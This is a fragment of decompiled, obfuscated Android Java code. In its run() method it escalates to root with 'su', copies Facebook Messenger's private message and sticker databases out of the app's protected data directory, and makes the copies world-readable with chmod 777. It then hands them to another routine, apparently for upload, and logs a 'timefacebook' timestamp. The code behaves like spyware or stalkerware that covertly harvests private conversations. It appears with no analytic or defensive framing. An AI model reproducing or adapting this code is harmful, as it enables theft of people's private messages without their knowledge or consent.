                        r24 = r24;
                    } catch (Exception e16) {
                        e = e16;
                        j2 = j5;
                        r24 = r15;
                        i = 0;
                        r24 = r24;
                        e.getStackTrace();
                        e.getStackTrace();
                        Crashlytics.logException(e);
                        r24 = r24;
                        if (j2 != 0) {
                        }
                        a(aVar, r24);
                        return;
                    }
                }
                j2 = j5;
                r24 = r15;
                i = 0;
                if (j2 != 0) {
                    a.b.a.a.a.a(context2.getSharedPreferences("user", i), "timefacebook", j2);
                }
                a(aVar, r24);
                return;
            }
        }
    }

    public void run() {
        String str = " \n";
        String str2 = " > ";
        String str3 = "/data/data/com.facebook.orca/databases/";
        String str4 = "cat ";
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f155b) {
            a(this.f156a);
            return;
        }
        f155b = true;
        try {
            if (e.n(this.f156a) == 0) {
                a.c.e.c.b(this.f156a);
            }
            if (e.n(this.f156a) != 0) {
                long n = e.n(this.f156a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append(str4);
                sb.append(str3);
                sb.append("threads_db2");
                sb.append(str2);
                sb.append(a.c.e.c.a());
                sb.append("Facebook.db");
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append(str4);
                sb2.append(str3);
                sb2.append("stickers_db");
                sb2.append(str2);
                sb2.append(a.c.e.c.a());
                sb2.append("Stickers.db");
                sb2.append(str);
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod 777 ");
                sb3.append(a.c.e.c.a());
                sb3.append("* \n");
                dataOutputStream.writeBytes(sb3.toString());
                StringBuilder sb4 = new StringBuilder();
                sb4.append("chmod -R 777 ");
                sb4.append(a.c.e.c.a());
                sb4.append("\n");
                dataOutputStream.writeBytes(sb4.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f156a, a.c.e.c.a(), "Facebook.db", "Stickers.db", n);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f155b = false;
        a(this.f156a);
    }
}
